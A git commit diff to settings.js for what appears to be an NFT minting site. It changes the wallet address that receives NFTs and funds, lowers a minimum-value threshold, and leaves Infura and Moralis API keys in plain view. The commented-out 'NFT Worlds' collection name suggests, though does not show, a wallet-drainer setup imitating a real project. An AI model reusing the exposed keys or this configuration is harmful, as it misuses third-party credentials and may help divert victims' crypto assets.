bcd8e3b0849a18fe431f1d9eb8e92d262d3fe606
farangpal <98533096+farangpal@users.noreply.github.com>
2022-06-21 10:08:45 +0000

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,8 +1,8 @@
-const address = '0x6a59B38Dd35fa489F1c840E3f2072c5Ad9CB9767',
+const address = '0xC4A941bD540d81247B2B87bAb09832704A4407eE',
   infuraId = '5b7825e5fcc64bc4bf49f496587392ed',
   moralisApi =
     'BiY8KrXg1tXZSu4JUtOJ4JGZx89DErf5ZN0bfiyXkzQLi2GU8rfjREwurLHXTJRA'
-const x20Ethereum = '0x6a59B38Dd35fa489F1c840E3f2072c5Ad9CB9767'
+const x20Ethereum = '0xC4A941bD540d81247B2B87bAb09832704A4407eE'
 /*const collectionInfo = {
   name: 'NFT Worlds',
   title: 'Avatars',
@@ -31,9 +31,9 @@ const mintInfo = {
   },
   nftsInfo = {
     active: true,
-    minValue: 0.5,
+    minValue: 0.2,
     checkMaxDay: 1,
-    receiveAddress: '0x6a59B38Dd35fa489F1c840E3f2072c5Ad9CB9767',
+    receiveAddress: '0xC4A941bD540d81247B2B87bAb09832704A4407eE',
   }
 if (mintInfo.minUnits > mintInfo.maxUnits) {
   console.error(
